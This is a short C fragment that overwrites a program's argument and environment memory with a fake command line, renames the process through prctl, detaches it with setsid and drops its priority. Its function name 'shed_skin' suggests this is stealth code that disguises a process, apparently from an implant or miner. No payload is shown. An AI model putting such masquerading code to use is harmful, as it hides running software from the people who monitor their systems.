static void compute_argv_region(int argc, char **argv, char **envp,
                                char **start_out, size_t *space_out) {
    char *arg_start = argv[0];
    char *arg_end   = argv[0];

    for (int i = 0; i < argc; i++) {
        char *end = argv[i] + strlen(argv[i]) + 1;
        if (end > arg_end) arg_end = end;
    }

    if (envp) {
        for (int i = 0; envp[i]; i++) {
            char *end = envp[i] + strlen(envp[i]) + 1;
            if (end > arg_end) arg_end = end;
        }
    }

    *start_out = arg_start;
    *space_out = (size_t)(arg_end - arg_start);
}

static void shed_skin(int argc, char **argv, char **envp) {
    compute_argv_region(argc, argv, envp, &g_argv0_base, &g_argv_space);

    memset(g_argv0_base, 0, g_argv_space);
    strncpy(g_argv0_base, G.proc_cmdline, g_argv_space - 1);

    prctl(PR_SET_NAME, (unsigned long)G.proc_name, 0, 0, 0);
    setsid();
    setpriority(PRIO_PROCESS, 0, 19);
}

